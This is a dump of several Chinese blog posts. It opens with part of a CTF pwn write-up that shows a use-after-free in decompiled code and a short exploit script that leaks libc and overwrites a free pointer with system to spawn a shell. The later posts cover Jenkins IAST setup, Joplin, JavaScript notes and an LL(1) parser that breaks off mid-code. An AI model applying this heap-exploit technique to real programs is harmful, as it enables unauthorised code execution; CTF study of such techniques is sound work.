12345678910111213141516171819202122void __cdecl show_item(){ Item *item; // ST00_8 Item *v1; // ST00_8 int index; // [rsp+Ch] [rbp-4h] puts(&quot;Which item?&quot;); fflush(stdout); index = read_num(); if ( index &lt; items_cnt &amp;&amp; item_array[index] ) { item = item_array[(unsigned __int8)index]; puts(&quot;Item Detail:&quot;); printf(&quot;Name:%s\\n&quot;, item-&gt;name, item); printf(&quot;Description:%s\\n&quot;, v1-&gt;description); fflush(stdout); } else { puts(&quot;Hacker!&quot;); }} 它会检查下标是否越界，以及下标对应的元素是否存在。然而，在删除时： 12345678910111213141516171819void __cdecl remove_item(){ int index; // [rsp+Ch] [rbp-4h] puts(&quot;Which item?&quot;); fflush(stdout); index = read_num(); if ( index &lt; items_cnt &amp;&amp; item_array[index] ) { ((void (__fastcall *)(Item *))item_array[index]-&gt;free)(item_array[index]); set_null(item_array[index]); puts(&quot;The item has been removed&quot;); fflush(stdout); } else { puts(&quot;Hacker!&quot;); }} 调用了结构体自己的free函数，参数是结构体偏移为0的位置也就是name。随后的set_null函数并不会把item_array[index]置空，因此即使删除了元素，item_array[index]仍然存在，第二项检查毫无作用。这就是为什么我们可以show一个空闲块从而泄露libc。 然后我们就有了system地址，容易想到用它覆盖结构体指针的free，然后让结构体指针的name指向/bin/sh。不过，如果这里直接add新的chunk，首先会分配我们不可控的0x20的结构体指针，然后才是可控的0x30的name。因此我们希望name字段被分配到的实际上是原来chunk0的结构体指针，这样就可以写入结构体指针了。要做到这一点，可以先free(chunk1)产生一个大小合适的chunk。那么再add时，结构体指针就会使用原来chunk1的了。 1234567891011121314151617181920212223242526def add(name,len,content): sla(':\\n','1') sla('?\\n',name) sla('?\\n',str(len)) sla('?\\n',content)def free(index): sla(':\\n','4') sla('?\\n',str(index))def show(index): sla(':\\n','3') sla('?\\n',str(index))add('chunk0',0x80,'a')add('chunk1',0x80,'b')free(0)show(0)ru('tion:')base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10leak('base',base)system = base + libc.sym['system']free(1)add('/bin/sh;'+'a'*8+p64(system),0x18,'c')free(0)","link":"/post/JarvisPwn/"},{"title":"Jenkins 集成 IAST 全流程","text":"工作中写的一份指南文档。由于用的是测试环境，并没有需要脱敏的地方。 环境准备之前 XXX（同事名）已经按照 DevSecOps Studio 中的说明搭建好了 DevSecOps 的基本环境，可以从他那里拷贝一份。由于我们演示时只需要用到 GitLab 和 Jenkins 两个虚拟机，其它的可以不用拷贝。大小在 11G 左右。 拷贝完成后，目录结构大致如下： 这里的 2200 , 2201 是配置端口转发后，两个虚拟机的 ssh 服务在本机上的对应端口，可以不用更改。 创建虚拟机 这一部分的操作对 GitLab 和 Jenkins 都需要做。 在创建虚拟机前需要先修改 .vbox 文件的配置，用文本编辑器打开 .vbox 文件，搜索 \\Users\\neoo\\gitool\\，替换为你电脑上存放 DevSecOps-Studio 的目录（绝对路径）。例如我的电脑上是： 实际上，只需要保证文件 ubuntu-xenial-16.04-cloudimg-console.log 和 gitlab-2201 文件夹处于同一目录下。 随后打开 VirtualBox ，点击 工具-&gt;注册 并选择对应的 .vbox 文件，即可导入两个虚拟机： 配置虚拟机 ssh（可选） 这一部分的操作不是必需的。 进入虚拟机设置界面，点击 网络-&gt;高级-&gt;端口转发 ，就可以将虚拟机的 ssh 端口映射到本机。正常情况下，此时已经映射到了 2200/2201 端口。 接下来，需要启动虚拟机，用 vagrant/vagrant 登录，并运行： 1sudo vim /etc/ssh/sshd_config 将 52 行改为： 1PasswordAuthentication yes 最后运行： 1sudo service sshd restart 这样就可以通过本机的 ssh 客户端连接虚拟机了： 网络配置默认情况下，Jenkins 和 GitLab 都采用 NAT 模式，此时我们本机是无法 ping 通虚拟机的。为了后续操作方便，我们可以将 GitLab 设置为桥接模式，即在 网络-&gt;连接方式 中选择桥接网卡。 此时再启动 GitLab，用 vagrant/vagrant 登录，并运行 ifconfig | more ，可以看到桥接模式下的 IP 地址，这个地址对我们本机而言是可达的。 如图所示，GitLab 虚拟机的 IP 为 192.168.0.109。 桥接模式下就不需要端口转发了。此时 ssh 连接的目标也变成 192.168.0.109:22。 由于 GitLab 的服务运行在 443 端口，此时直接访问 https://192.168.0.109 是可以看到 GitLab 界面的。当然，也有可能是如下界面： 这种情况下一般只需要多等待一会儿就好了。 之所以采用桥接模式，是为了配合解析 GitLab 内置的域名 gitlab.local。现在只需要修改本机 hosts 文件，让 gitlab.local 解析到 192.168.0.109 即可。 访问 https://gitlab.local，应该能得到正常的 GitLab 登录页面了。 默认情况下 Jenkins 虚拟机应该能够解析 gitlab.local 域名，如果后面设置 Jenkins 时遇到域名解析问题，请检查 Jenkins 虚拟机的 /etc/hosts 文件。 如果需要信任 GitLab 的自签名证书，可以先 cd /etc/gitlab &amp;&amp; sudo mv ssl/* ./，然后将 gitlab.local.crt 通过 SFTP 下载到本机并导入到受信任的根证书颁发机构里。 GitLab 配置注册账号、登录、创建新的公开 repo。在本地准备一个 Java Web 应用，我使用的是java-sec-code 这个项目。 如果使用其它项目，请确保可以在 Java 6/7/8 中的至少一个运行环境上运行。原因： 随后删除原项目目录下 .git 目录（如果你对 git 比较熟悉也可以不删除），运行（项目名需自行替换）： 123456cd java-sec-codegit initgit remote add origin https://GitLab.local/merc/java-sec-code.gitgit add .git commit -m &quot;Initial commit&quot;git push -u origin master 即可将项目推送到 GitLab 上。期间遇到的问题请参考 Git 文档。 Jenkins 配置首先配置端口转发，将虚拟机 8080 端口映射到本机的任意未占用端口，如 8008： 然后访问http://localhost:8008/ ，即可看到 Jenkins 页面。 接下来，按照 雳鉴 IAST 第三方插件帮助文档 一步步配置 Jenkins。需要注意的几点： 雳鉴中提供的 Jenkins 插件可能存在兼容性问题，请务必使用修改后的 IAST.hpi 文件代替。 第二步中 IAST服务器地址 请填写公网雳鉴地址，即http://47.100.14.22:81/。 第三步结束后，先如图配置好 repo 地址（项目名需自行替换）： 第四步中 被测站点地址 即部署 Java Web 应用的服务器地址，形式一般是 ip:port。 在第五步前，请先在服务器上部署好 Java Web 应用并运行，防止雳鉴中项目创建失败。例如我的应用是基于 Springboot 的，只需要运行 java -jar java-sec-code-1.0.0.jar 即可。 在构建完成后，预期结果是在雳鉴中创建了新的项目。但是扫描结果中是没有漏洞的，因为还没有进行插桩： 进行插桩扫描进入新创建的项目详情页面下载 agent，然后 SFTP 传到服务器上。根据 雳鉴 IAST 插桩 agent 帮助文档来部署 agent。例如对于我的 Springboot 应用，只需要运行： 1java -javaagent:./iast_agent.jar -jar java-sec-code-1.0.0.jar 待项目启动后，通过浏览器访问 Java Web 应用，即可在项目详情页面看到已经启动的 agent 了。 插桩扫描是基于流量的，因此只有发送请求后才能检测到 agent。 接下来对要测试的功能点发送请求即可进行扫描。例如对于存在 SSRF 漏洞的功能点发起请求： 在雳鉴界面中可以看到： 这时回到 Jenkins 再次进行构建，就可以得到正确的扫描结果了： 附录 内网（仅主机网络下） IP： Jenkins：10.0.1.11 GitLab： 10.0.1.15 相关目录： Jenkins：/var/lib/jenkins，项目目录位于 jobs 下 GitLab：/etc/gitlab，配置文件为 gitlab.rb 在 Jenkins 中删除一个项目后，重新创建新项目前建议运行 rm -rf /var/lib/jenkins/jobs/jobs","link":"/post/JenkinsIAST/"},{"title":"Joplin 使用小记","text":"折腾笔记软件。 背景说是要找一款笔记软件，实际上我最主要的需求还是剪藏网页离线浏览、全文搜索、本地和云端同步这些功能，因为自己写的笔记主要靠 Typora + Hexo + ghPages 放在这个博客里。由于不是特别刚需，就没有什么付费的意愿。在 Big Sur 11.4 M1 上经过了一番折腾，发现以下软件都不能很好的契合需求： 印象笔记：剪藏功能非常好用，效果也是能找到的工具中最佳的，然而有时候排版效果不怎么样；免费版每月 60M 上传限制有点少；最让人不能忍受的则是其 bug 频出的桌面客户端。 有道云笔记：剪藏效果不佳，整体使用体验也一般。 为知笔记 / Baklib 等：没有长期可用的免费版。 OneNote：对我来说笔记自由度有点太高了；同步速度问题比较大。 Notion：同类天花板，不过学习成本有点高，相当多的强大功能对我而言也不太必要；同样面临剪藏效果和同步速度的尴尬问题。 wolai：Notion本地化的版本，没有同步速度的问题，其他问题依然存在，且 bug 不少。依赖 web-clipper，虽然很多人都说好用，但是这个适配了很多笔记软件的工具的剪藏效果对我来说依然不够好。 Bear：依赖 web-clipper；非会员无法导出 PDF。目前对 Typora 很满意，以后可能会入手会员。 语雀：依赖 web-clipper；和石墨文档很像，感觉更适合团队用来写共享的技术文档，对个人来说有点太重了。 蚂蚁笔记：开源，依赖 web-clipper；界面、功能都相当简陋，bug较多。 专注笔记：依赖 web-clipper；功能比较少。 Cubox：免费版 200 条剪藏有点不够用。 Obisidian / Roam Research 等：功能很强大但似乎确实用不上。 Flomo / Google Keep / Pocket / Instapaper / Pinbox / 方片等：感觉产品定位不太符合自己的需求。 最后选择了开源的 Joplin，相比同样开源的蚂蚁笔记，使用体验明显要好很多。最重要的是，其剪藏效果我认为是仅次于、甚至部分情况下优于印象笔记剪藏的。 基础配置官网下载后，可以进行一些简单配置： 通用选项：修改语言、日期格式和使用的外部 Markdown 编辑器，这里可以直接用 /Applications/Typora.app。 同步：修改云同步的选项。 外观：修改主题、字体大小和自定义 css。我不怎么用 Dracula 配色，不过这个软件里的 Dracula 还算挺好看的。后文会阐述如何通过配置自定义 css 实现侧边栏目录的功能。 笔记：可以选择不把地理位置信息保存到笔记中。 插件：可以搜索安装插件，当然也能自己开发一个装上去，这是开源软件的最大优势了。 Markdown：可以开关各种 Markdown 的功能，这里可以发现 Joplin 相比部分同类产品在 Markdown 支持上的优势。 笔记历史：修改笔记历史的保留期限，直接影响 Joplin 记录的笔记占用的磁盘空间大小。 加密：这个部分建议参考官方文档，否则可能在解密时遇到问题。 网页剪辑器：在客户端启用网页剪辑服务，随后在 Chrome 应用商店可以下载安装 Joplin Web Clipper，首次启动该插件需要回到 Joplin 客户端授予权限；如果使用类似 web-clipper 的第三方剪藏工具，则可以复制该页下方的授权令牌。 侧边栏目录Joplin 默认没有这个功能，但是支持 Markdown 的目录扩展，所以在笔记任意位置插入 [toc] 即可生成目录。为了让这个目录悬浮到右边，参考官方论坛上的一个回答简单写个 css（这里的背景色是根据 Dracula 主题设置的，可自行修改）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293/* For styling the rendered Markdown */:root { /*TOCsidebar的相关变量 , Toc SideBar variables definition */ --tocsidebar-fontsize: 16px; /*TocSideBar的字体大小，TocSideBar's fontsize*/ --tocsidebar-bg: #313640; /*TocSideBar的面板背景色 , TocSideBar's panel color*/ --tocsiderbar-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.2); /*TocSideBar的阴影设置 , TocSideBar's shadow */ --tocsiderbar-radius:10px; /*TocSideBar的圆角度 , TocSideBar's radius */ --tocsiderbar-leftline: 1px solid rgba(255, 255, 255, 0.5); /*TocSideBar左边竖线线颜色和不透明度，0为全透明，1为不透明, TocSideBar's left line for Classification befor link*/ --tocsidebar-linkcolor: #FFFFFF; /*TocSideBar链接颜色 , link color*/ --tocsidebar-linkcolor-opacity: 0.8; /*TocSideBar链接颜色的不透明度, link color's opacity */ --tocsidebar-linkhovercolor: #E71B64; /*TocSideBar链接悬停时的颜色 #E71B64-玫红色, link color when cursor hovering */ --tocsidebar-linkhovercoloropacity: 1; /*TocSideBar链接悬停时的颜色的不透明度, link color's opacity when cursor hovering */}/************************************************************************************************** * TABLE OF CONTENTS * Based on the idea from here: * -https://discourse.joplinapp.org/t/toc-as-the-sidebar/5979/8 * -https://discourse.joplinapp.org/t/toc-as-the-sidebar/5979/34 * -https://discourse.joplinapp.org/t/share-your-css/1730/192 *************************************************************************************************/nav.table-of-contents &gt; ul { /*面板固定在右上角, fix Toc panel on the right of the window , this panel is used for activing toc sidebar */ position: fixed; top: 0; right: 6px; z-index: 10; font-size: var(--tocsidebar-fontsize); /*目录字体大小，可设置为16PX或small,16px比较合适， toc sidebar's fontsize, 16px is better for our eyes*/ height: 85%; padding: 5px; overflow: hidden; min-width: 20px; /* 右侧面板宽度,也可用 width: 20px;设置在鼠标到达右侧20px范围内时激活TocSideBar, 20px means the Toc sidebar will be active when cursor within 20px on the right side of the window */ background: none; /* 面板无背景色填充 */}nav.table-of-contents ul { /*所有目录li的父框ul设置，即所有目录父框的设置*/ list-style-type: none; margin-bottom: 0; margin-left: 8px; /*分类距离tocsidebar边缘，8px*/ margin-top: 0;}nav.table-of-contents &gt; ul:hover { /*TocSideBar弹出时，背景底框的设置 所以用&gt;只选择一级目录li的父框ul ，填充背景色和阴影以显示TocSideBar*/ background-color: var(--tocsidebar-bg); border-radius: var(--tocsiderbar-radius); box-shadow: var(--tocsiderbar-shadow); overflow: scroll; width: auto; /*根据内容自动调整宽度 ,但会导致字体加粗显示时跳动, Automatically adjust width according to content */}nav.table-of-contents &gt; ul:hover li { display: list-item; min-width: 120px; /*Toc SideBar最小宽度，Toc SideBar 's minimum width*/}nav.table-of-contents li { display: none; line-height: 1.8em; margin-bottom: 0; white-space: nowrap;}nav.table-of-contents &gt; ul &gt; li &gt; ul li {/*设置目录前的分类线，也可以这样(空格表示所有子孙代li)写 nav.table-of-contents ul li ul li */ border-left: var(--tocsiderbar-leftline); !important;}nav.table-of-contents li a { color: var(--tocsidebar-linkcolor); opacity: var(--tocsidebar-linkcolor-opacity); padding: 5px;}nav.table-of-contents a { /*去掉下划线,remove link's underline */ text-decoration: none !important;}nav.table-of-contents li a:hover { /*悬停时，改变字体样式，change font style when cursor hovering*/ color: var(--tocsidebar-linkhovercolor); /*link color when cursor hovering */ opacity: var( --tocsidebar-linkhovercoloropacity);} 保存到 ~/.config/joplin-desktop/userstyle.css 并重启客户端即可。 修改 Markdown 展示字体大小在配置里可以直接修改 Markdown 编辑时的字体大小，而展示时的字体大小则需要修改之前提到的 userstyle.css： 123456body,th,td,.inline-code { font-size: 18px;} 配合简悦使用简悦也提供了 Chrome 插件，主要是提供纯净阅读视图的。虽然的确是很优秀的软件，也能做到开箱即用，但是过多的配置项总会让人感到有些无所适从（即使是在简洁模式下）。 在剪藏微信公众号文章时无意中发现，Joplin 的剪藏工具对其中图片的处理有些问题（老封闭平台了），而经过简悦处理后再用 Joplin 剪藏则效果完美，因此将 mp.weixin.qq.com 加入到了简悦白名单里，反正本来读公众号文章也要开阅读模式的。 此外，简悦也支持绑定 Joplin 并在阅读模式下直接 “保存到 Joplin”，然而我并不推荐这样做。简悦对不少非中文网站以及小众站点的支持相当有限，阅读模式也经常会出现一些格式错误，和 web-clipper 剪藏效果是类似的。因此，还是使用 Joplin Web Clipper 做剪藏能保证最佳的效果。 清理无用图片剪藏网页时，剪藏图片是非常重要的，但文章中间或者末尾总会出现我们不怎么需要的图片。由于 Joplin 缓存历史的机制，在笔记中删除了这些图片后不会在本地立即清理掉这些无用的图片。因此找到了一款工具 jnrmor 来辅助实现该功能，不太清楚 Joplin 的官方 CLI 或者 API 能不能实现。 下载 jnrmor 脚本后，首先安装新的 get-opt： 1brew install gnu-getopt 随后将新的 get-opt 添加到环境变量，避免使用自带的 get-opt。在 .zshrc 或 .bashrc 末尾写入： 1export PATH=&quot;/opt/homebrew/opt/gnu-getopt/bin:$PATH&quot; 接下来编辑配置文件 .jnrmor.conf： 12345678# Joplin profile directory (where the database is located)JOPLIN_DIR=~/.config/joplin-desktop# TOKEN for Joplin Web Clipper (can be found in 'Web clipper options')CLIPPER_TOKEN=xxxxxxxx# Web Clipper Port (can be found in 'Web clipper options')CLIPPER_PORT=41184 注意将 xxxxxxxx 替换为自己的授权令牌。最后运行 ./jnrmor 即可。 自建 Joplin Server 进行云同步参考官方文档和这篇文章，既可以用其内置 SQLite 的 docker 来测试，又可以用 docker-compose 同时启动 PostgreSQL 和 Joplin Server。 .env 文件： 12APP_BASE_URL=http://ip:port # modify ip and portAPP_PORT=22300 随后运行： 12docker volume create joplindocker run -d --name joplin_server -v joplin:/home/joplin --env-file ~/joplin/.env -p port:22300 joplin/server:2.2.7-beta # modify port 注意使用 latest 镜像可能导致出现 Not allowed: PUT 的问题，需要使用最新的 beta 镜像确保升级到v2，参考官方论坛。 登录 Joplin Server 后修改邮箱和密码，将相同配置填入客户端的同步选项中即可。 Joplin 缺点 英文标签只能使用小写字母 云同步接口较少 剪藏墙外文章速度会有点慢 UI 可以更好看","link":"/post/Joplin/"},{"title":"Javascript 杂记","text":"温故而知新。 数据类型 typeof 检查输入参数机器码后三位，000 代表 object 类型，而 null 恰好用全 0 表示。 1typeof(null) // object typeof 对于未实现 [[Call]] 方法的引用类型返回 object ，已实现该方法的则返回 function。 1typeof Array // function 简单类型和作为 object 的复杂类型： 12typeof('hello') // stringtypeof(new String('hello')) // object instanceof 判断实例时向上追踪原型链。 12[] instanceof Array[] instanceof Object 比 typeof 更准确的类型判断： 1Object.prototype.toString.call([]) // Array 逻辑运算符与非布尔类型混用： 1235 || 0 // 50 || 'a' // 'a'5 &amp;&amp; 0 // 0 拆箱时调用 toPrimitive() 方法： 如果是原始类型值则直接返回； 否则调用 .valueOf()，如果返回值是原始类型值则返回； 否则调用 .toString()，返回得到的 string。 123456[].valueOf() // [][].toString() // ''{}.valueOf() // {}{}.toString() // [object Object][] + [] // ''[] + {} // [object Object] 部分浏览器中将 {} 视作空代码块： 1{} + [] // 0 深浅拷贝浅拷贝 遍历赋值 123for (var i in origin) { clone[i] = origin[i] } Object.create，实际会拷贝到 clone 的 _proto_ 上： 1clone = Object.create(origin) 深拷贝 借助 JSON： 1clone = JSON.parse(JSON.stringify(origin)) Object.assign，与空对象合并： 1clone = Object.assign({}, origin) 编码 escape 不会对字母、数字以及*@-_+./ 进行编码，对其他所有字符均进行编码，目前已废弃。 encodeURI 将输入参数视作完整的 URI，不会对字母、数字以及 ,/?:@&amp;=+$# 进行编码，对其他所有字符均进行编码。 encodeURIComponent 将输入参数视作 URI 的一部分，不会对字母、数字以及 -_.!~*'() 进行编码，对其他所有字符均进行编码。 函数与作用域 函数与变量的声明会被提前到所在作用域最前面。变量赋值不会被提前。 闭包： 12345678910function foo() { var a = 2 function bar() { console.log(a) } return bar}var baz = foo()baz() // 2 一个经典例子，timer 访问到的 i 是循环结束后的全局作用域中的 i： 12345for (var i=1; i&lt;=5; ++i) { setTimeout(function timer() { console.log(i) }, i*1000)} // 6 6 6 6 6 解决方案： 用 IIFE 创建作用域 1234567for (var i=1; i&lt;=5; ++i) { (function(j) { setTimeout(function timer() { console.log(j) }, j*1000) })(i)} // 1 2 3 4 5 借助 let 的特性 12345for (let i=1; i&lt;=5; ++i) { setTimeout(function timer() { console.log(i) }, i*1000)} // 1 2 3 4 5 类数组转为 Array： 1arr = Array.prototype.slice.apply(args) 实际上，调用 apply、call、bind 等方法均会对 this 进行显式绑定。 this 的默认绑定：内部函数（或者其他类似的找不到 this 指向的情况）中的 this 指向 window（严格模式下指向 undefined）： 123456789101112var a = { b: 1, getB: function() { function c() { console.log(this.b) // undefined } c() // window.c() console.log(this.b) // 1（隐式绑定） }}a.getB() 同理，回调函数也常常会丢失 this。 new 调用的所谓“构造函数”实际上是对新创建的对象进行初始化的一种“构造调用”，步骤如下： 创建新对象； 执行 [[Prototype]] 连接； 绑定 this，即所谓的 new 绑定； 如果调用的函数没有返回对象，则返回该新对象 优先级：new 绑定 &gt; 显式绑定 &gt; 隐式绑定 &gt; 默认绑定 箭头函数自动继承外层作用域的 this，且无法修改。 其他 sort 默认将元素转为字符串后升序排序。 12var arr = [2,13,3,11,5,7]arr.sort() // [11,13,2,3,5,7]","link":"/post/JsMisc/"},{"title":"LL语法分析器","text":"这次繁杂了许多，我有点害怕接下来的 LR(1)语法分析器了。 概述这次需要用 LL(1)方法也就是自顶向下方法实现语法分析器，并且需要识别并改正简单的语法错误（这里只出现了漏分号的错误）。举个栗子，输入： 123456{while ( ID == NUM ){ID = NUM}} 需要按这个格式输出： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152语法错误,第4行,缺少&quot;;&quot;program compoundstmt { stmts stmt whilestmt while ( boolexpr arithexpr multexpr simpleexpr ID multexprprime E arithexprprime E boolop == arithexpr multexpr simpleexpr NUM multexprprime E arithexprprime E ) stmt compoundstmt { stmts stmt assgstmt ID = arithexpr multexpr simpleexpr NUM multexprprime E arithexprprime E ; stmts E } stmts E } 遵循的规则，也就是 CFG 的产生式是： 1234567891011121314program -&gt; compoundstmtstmt -&gt; ifstmt | whilestmt | assgstmt | compoundstmtcompoundstmt -&gt; { stmts }stmts -&gt; stmt stmts | Eifstmt -&gt; if ( boolexpr ) then stmt else stmtwhilestmt -&gt; while ( boolexpr ) stmtassgstmt -&gt; ID = arithexpr ;boolexpr -&gt; arithexpr boolop arithexprboolop -&gt; &lt; | &gt; | &lt;= | &gt;= | ==arithexpr -&gt; multexpr arithexprprimearithexprprime -&gt; + multexpr arithexprprime | - multexpr arithexprprime | Emultexpr -&gt; simpleexpr multexprprimemultexprprime -&gt; * simpleexpr multexprprime | / simpleexpr multexprprime | Esimpleexpr -&gt; ID | NUM | ( arithexpr ) 注意到这里面已经消除了左递归，也没有公共左因子（最后发现也没有二义性），非常舒服。 起始符是program，保留字有： 123456789{ }( )if then elsewhileID NUM&gt; &lt; = &gt;= &lt;= ==+ -* /E 是'空' 思路与代码其实坑不多，但是容易自己给自己挖坑，例如抄规则把规则抄错等，其实很难发现。 准备工作首先我们需要将产生式存下来。由于产生式本身是一种映射关系，容易想到用map存储。因为懒得处理|，直接把用|分隔的产生式拆开。这样一来，产生式左边的非终结符就可能出现多次，因此最终使用了multimap。 123456789101112131415161718192021222324252627282930313233343536373839const multimap&lt;string, string&gt; rules = { {&quot;program&quot;, &quot;compoundstmt&quot;}, {&quot;stmt&quot;, &quot;ifstmt&quot;}, {&quot;stmt&quot;, &quot;whilestmt&quot;}, {&quot;stmt&quot;, &quot;assgstmt&quot;}, {&quot;stmt&quot;, &quot;compoundstmt&quot;}, {&quot;compoundstmt&quot;, &quot;{ stmts }&quot;}, {&quot;stmts&quot;, &quot;stmt stmts&quot;}, {&quot;stmts&quot;, &quot;E&quot;}, {&quot;ifstmt&quot;, &quot;if ( boolexpr ) then stmt else stmt&quot;}, {&quot;whilestmt&quot;, &quot;while ( boolexpr ) stmt&quot;}, {&quot;assgstmt&quot;, &quot;ID = arithexpr ;&quot;}, {&quot;boolexpr&quot;, &quot;arithexpr boolop arithexpr&quot;}, {&quot;boolop&quot;, &quot;&lt;&quot;}, {&quot;boolop&quot;, &quot;&gt;&quot;}, {&quot;boolop&quot;, &quot;&lt;=&quot;}, {&quot;boolop&quot;, &quot;&gt;=&quot;}, {&quot;boolop&quot;, &quot;==&quot;}, {&quot;arithexpr&quot;, &quot;multexpr arithexprprime&quot;}, {&quot;arithexprprime&quot;, &quot;+ multexpr arithexprprime&quot;}, {&quot;arithexprprime&quot;, &quot;- multexpr arithexprprime&quot;}, {&quot;arithexprprime&quot;, &quot;E&quot;}, {&quot;multexpr&quot;, &quot;simpleexpr multexprprime&quot;}, {&quot;multexprprime&quot;, &quot;* simpleexpr multexprprime&quot;}, {&quot;multexprprime&quot;, &quot;/ simpleexpr multexprprime&quot;}, {&quot;multexprprime&quot;, &quot;E&quot;}, {&quot;simpleexpr&quot;, &quot;ID&quot;}, {&quot;simpleexpr&quot;, &quot;NUM&quot;}, {&quot;simpleexpr&quot;, &quot;( arithexpr )&quot;} /*{&quot;e&quot;,&quot;t e'&quot;}, {&quot;e'&quot;, &quot;+ t e'&quot;}, {&quot;e'&quot;, &quot;E&quot;}, {&quot;t&quot;, &quot;f t'&quot;}, {&quot;t'&quot;, &quot;* f t'&quot;}, {&quot;t'&quot;, &quot;E&quot;}, {&quot;f&quot;, &quot;( e )&quot;}, {&quot;f&quot;, &quot;id&quot;}*/}; 最后被注释掉的部分是一个更简单的 CFG，在后面检验 FIRST 集、FOLLOW 集和分析表时，我们会看到先处理这个简单 CFG 的情况要容易得多。 接下来是存储终结符与非终结符。原本的想法是采用数组，但是仔细想一想，我们存储所有终结符和非终结符是为了做什么？ 因为这些符号需要作为 LL 分析表的行和列，这意味着对于任意一个符号，我们将需要确定它在对应集合中的位置，以便在分析表中插入条目。而分析表采用什么数据结构最合适？简便起见，我们采用了二维数组，这样方便我们用table[non_terminal_pos][terminal_pos]来唯一确定表的条目。也就是说，这个集合需要是有序的，因为分析表是有序的。此外，我们还知道：数组下标必须是数字；终结符和非终结符都是唯一的。 用set和map都可以满足有序性（偷懒起见，我当然不想在插入时自己考虑顺序问题，而优先队列并不适合随机访问）和唯一性。然而，二者都会基于终结符和非终结符的字典序排序，要找到一个符号我们必须使用find方法。这样也许不会有什么效率问题，但不够优雅。 但我们其实可以强行规定一个顺序，从而无视原来的排序，像这样： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354map&lt;string, int&gt; nt = { // non-terminals, the map below is terminals {&quot;program&quot;, 0}, {&quot;stmt&quot;, 1}, {&quot;compoundstmt&quot;, 2}, {&quot;stmts&quot;, 3}, {&quot;ifstmt&quot;, 4}, {&quot;whilestmt&quot;, 5}, {&quot;assgstmt&quot;, 6}, {&quot;boolexpr&quot;, 7}, {&quot;boolop&quot;, 8}, {&quot;arithexpr&quot;, 9}, {&quot;arithexprprime&quot;, 10}, {&quot;multexpr&quot;, 11}, {&quot;multexprprime&quot;, 12}, {&quot;simpleexpr&quot;, 13} /*{&quot;e&quot;, 0}, {&quot;e'&quot;, 1}, {&quot;t&quot;, 2}, {&quot;t'&quot;, 3}, {&quot;f&quot;, 4}*/};map&lt;string, int&gt; t = { {&quot;{&quot;, 0}, {&quot;}&quot;, 1}, {&quot;(&quot;, 2}, {&quot;)&quot;, 3}, {&quot;if&quot;, 4}, {&quot;then&quot;, 5}, {&quot;else&quot;, 6}, {&quot;while&quot;, 7}, {&quot;ID&quot;, 8}, {&quot;=&quot;, 9}, {&quot;&gt;&quot;, 10}, {&quot;&lt;&quot;, 11}, {&quot;&gt;=&quot;, 12}, {&quot;&lt;=&quot;, 13}, {&quot;==&quot;, 14}, {&quot;+&quot;, 15}, {&quot;-&quot;, 16}, {&quot;*&quot;, 17}, {&quot;/&quot;, 18}, {&quot;NUM&quot;, 19}, {&quot;E&quot;, 20}, {&quot;;&quot;, 21}, {&quot;$&quot;, 22} /*{&quot;+&quot;, 0}, {&quot;*&quot;, 1}, {&quot;(&quot;, 2}, {&quot;)&quot;, 3}, {&quot;id&quot;, 4}, {&quot;E&quot;, 5}, {&quot;$&quot;, 6}*/}; 好吧，这样也算不上优雅。 最后是存储分析表，如上文所述，我采用了二维string数组的方式，数组内只存储产生式右边的字符串，因为产生式左边必定是该行对应的非终结符。 计算 FIRST 集和 FOLLOW 集首先要考虑的问题依然是，用什么数据结构存储这两个集合？ 以 FIRST 集为例，我们知道一个符号的 FIRST 集是由多个终结符组成的集合。同一集合中，这些终结符不会重复，而且我们并不关心它们的顺序。各种操作的复杂度为O(1)的unordered_set无疑是最佳选择了。随后再利用map建立符号与其 FIRST 之间的联系。 123typedef unordered_set&lt;string&gt; str_set;map&lt;string, str_set&gt; FIRST, FOLLOW; FIRST 集和 FOLLOW 集的具体计算方法这里不再赘述。但值得一提的是，它们的共通之处是都通过循环来更新集合本身，直到集合不再发生变化。而在这里的代码中，我不知道为什么写了个递归版本。 FIRST 集： 12345678910111213141516171819202122232425262728293031323334353637/* Whether there's a rule lhs -&gt; rhs */bool exist_rule(const string &amp;lhs, const string &amp;rhs) { for (auto iter = rules.lower_bound(lhs); iter != rules.upper_bound(lhs); ++iter) { if (iter-&gt;second == rhs) { return true; } } return false;}/* Compute FIRST[expr] recursively */str_set compute_first(const string &amp;expr) { if (!FIRST[expr].empty()) { // Already calculated return FIRST[expr]; } if (exist_rule(expr, &quot;E&quot;)) { FIRST[expr].insert(&quot;E&quot;); } string y_n; // X -&gt; y_1 y_2 ... y_n ... stringstream ss; str_set tmp; for (auto iter = rules.lower_bound(expr); iter != rules.upper_bound(expr); ++iter) { ss.clear(); ss.str(iter-&gt;second); while (ss &gt;&gt; y_n) { tmp = compute_first(y_n); if (!tmp.count(&quot;E&quot;)) { FIRST[expr].insert(tmp.begin(), tmp.end()); // the same as set_union() in std::set break; } } } return FIRST[expr];} lowerbound和upperbound真的好用。另外要注意的是unordered_set不能用set_union方法，只能从头到尾全部insert。主函数中计算代码： 12345678910// Init FIRSTstr_set tmp;for (const auto &amp;expr: t) { tmp.clear(); tmp.insert(expr.first); FIRST.insert(make_pair(expr.first, tmp));}for (const auto &amp;expr: nt) { compute_first(expr.first);} FOLLOW 集： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/* Starting from start_pos, return the next consecutive substr without ws */string next_str(string str, string::size_type start_pos) { if (start_pos &gt; str.size()) { return &quot;E&quot;; // for FIRST[&quot;E&quot;] = {&quot;E&quot;} } string::size_type end_pos = str.find_first_of(&quot; \\n\\t&quot;, start_pos); if (end_pos == string::npos) { end_pos = str.size(); } return str.substr(start_pos, end_pos - start_pos);}/* Compute FOLLOW[expr] recursively */str_set compute_follow(const string &amp;expr) { if (follow_visited.count(expr)) { return FOLLOW[expr]; } follow_visited.insert(expr); // mark as visited string::size_type pos, end; str_set tmp, first_beta; for (const auto &amp;sspair: rules) { for (pos = 0; (pos = sspair.second.find(expr, pos)) != string::npos; pos = end) { // expr found in rhs end = pos + expr.size(); if ((end == sspair.second.size() || sspair.second[end] == ' ') &amp;&amp; (pos == 0 || sspair.second[pos-1] == ' ')) { // for u-know-y if (end == sspair.second.size()) { // At tail tmp = compute_follow(sspair.first); FOLLOW[expr].insert(tmp.begin(), tmp.end()); } else { // Not at tail, but E is in FIRST[string that follows] first_beta = FIRST[next_str(sspair.second, end+1)]; if 